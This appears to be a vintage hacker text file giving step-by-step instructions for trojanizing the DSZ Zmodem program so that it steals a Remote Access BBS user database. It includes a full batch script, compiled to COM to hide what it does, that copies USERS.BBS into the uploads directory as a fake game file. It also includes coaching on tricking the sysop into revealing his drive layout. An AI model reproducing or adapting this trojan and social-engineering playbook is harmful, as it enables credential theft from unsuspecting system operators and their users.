Remote Access BBS software sucks, and a SysOp who would want to run it is
asking for it, so we're going to teach him a lesson by doing some fun
things with his board.  The first thing we will do is steal his user
list.


First a program must be found that the SysOp wants and will execute on
his BBS system.  It could be a wide range of items.  It can be some soft-
ware (doesn't have to be pirate) that the operator has been requesting for
a while.  For this demonstration, we will use DSZ <Z modem>.


You will also need a program called BAT2EXEC.COM made by the staff at
PC-Magazine.  Its main purpose it to convert large Batch file to Com
files.  Com files run faster and cannot be aborted with ^C.


DSZ includes-

DSZ.DOC
DSZ.EXE

Rename DSZ.EXE to DSZ.DAT.


Now, make a batch file called DSZ.BAT.  It should look something
like this.

@ECHO OFF
IF EXIST C:\RA\USERS.BBS GOTO COPY
REM Checks to see if the USERS.BBS listing is there.
GOTO DSZ
:COPY
IF EXIST D:\FILES\UPLOAD\GAME.ZIP GOTO DSZ
REM Sets it to only copy once.
REM Now we want to copy the USERS.BBS listing to the new file
REN directory, under the name of GAME.ZIP
COPY C:\RA\USERS.BBS D:\FILES\UPLOAD\GAME.ZIP >DMP.DMP
REM DMP.DMP is used to redirect the screen output
REM Now is the tricky part.  You need to have FILES.BBS listing
REM add TOOBIN1.ZIP to it's listing of on-line files.
COPY DSZ.DMP + D:\FILES\UPLOAD\FILES.BBS
D:\FILES\UPLOAD\FILES.BAK > DMP.DMP
REM D:\files\upload will change depending on the sub-dir setup.
REM DSZ.DMP, a file you will need to make, is appended to
REM a listing of all available files.
COPY D:\FILES\UPLOAD\FILES.BAK D:\FILES\UPLOAD\FILES.BBS >DMP.DMP
DEL DMP.DMP
:DSZ
REM Now we want to run DSZ like normal.
REN DSZ.DAT DZ.EXE
REM Turn back on monitor
DSZ %1 %2 %3 %4 %5 %6 %7
REN DZ.EXE DSZ.DAT
REM All done!

This is a generic program and you will have to tailor it so it will
meet your needs.

Now, run BAT2EXEC DSZ.BAT, to create DSZ.COM

If the program does not "compile" and gives you some kind of error,
that means that your program is 'too small' to be converted.  Bat2exec
was made for large files, and really does not like small ones.  All you
have to do is add a couple 100 ECHO statements at then end of your program
and everything should be fine.

    Ok, remember how i said you need to add USERS.BBS (which was
renamed game.zip) to the FILES.BBS listing?  Ok, now create a
file that is called DSZ.DMP, and that looks like this.

GAME.ZIP  Game Disk #1, cracked by INC!
          (Description should start on 14th line)

   Now I will recap what will happen when you have everything
setup. The sysop sees that someone (You) has uploaded the newest
version of DSZ Z-Modem, so he installs it.  The files he places
in his protocol directory are:

DSZ.COM -Your batch file changed into COM.
DSZ.DAT -The real DSZ
DSZ.DOC -Docs to DSZ
DSZ.DMP -Has text that says "game.zip"

    Now, he gets his BBS software to run DSZ.COM, which he thinks is
DSZ. Because it's a com file, he can't tell what it does, which
is the whole reason for using BAT2EXEC.COM anyway.  There is no
way he can tell what DSZ.COM does. DSZ.COM runs, and copies
USERS.BBS listing to the new files listing under the name
GAME.ZIP.  Then, DSZ.DMP is added to the Files.BBS listing, so
when you do a listing of new files, it will be there.  Then
DSZ.DAT is renamed to DZ.EXE.  DZ.EXE is then run.  Then DZ.EXE
is renamed back to DSZ.DAT.  Now, all you have to do is download
GAME.ZIP, and you are off!

This procedure I have created for Remote Access boards, but you have
to know the SysOp's drive specifications.  Whether he has a C: or D:
drive, and what directory is Remote Access installed on.  This can
be found out simply by casually slipping it into the conversation.

SysOp: "Whadda ya want?  I'm masturbating!"

You: "How's it going!  Can I upload a really big big huge ware?"

SysOp: "k00l k0dEz!!&^**@!  Sure upload, I like uploads!"

You "Do you have the space for it?  Its really new and takes up
     a lot of space! How big is your hard disk?"

SysOp: "D00d, my HD is 60o g1gz!"

You: "So you only have one hard disk?"

SysOp "No d00d, I have two; a c: and d:!"

You: "we9o65hfgkjlæ9:Ë∫r45976hyt sorry man Line Noise, :?Ï.•ù6À
      28º+:7y3fdfvgjk goto run!"

At this point you know all the information.  The chances of the board
not being under the sub-directory of \RA are extremely slim.  If he says
he has one HD, you're all set.  If he says he has two, then it should
probably be on the c: drive, but ask him just in case.  Just slip it into
the conversation.  You'd be amazed how st00pid people can be!

So Until Next Time...
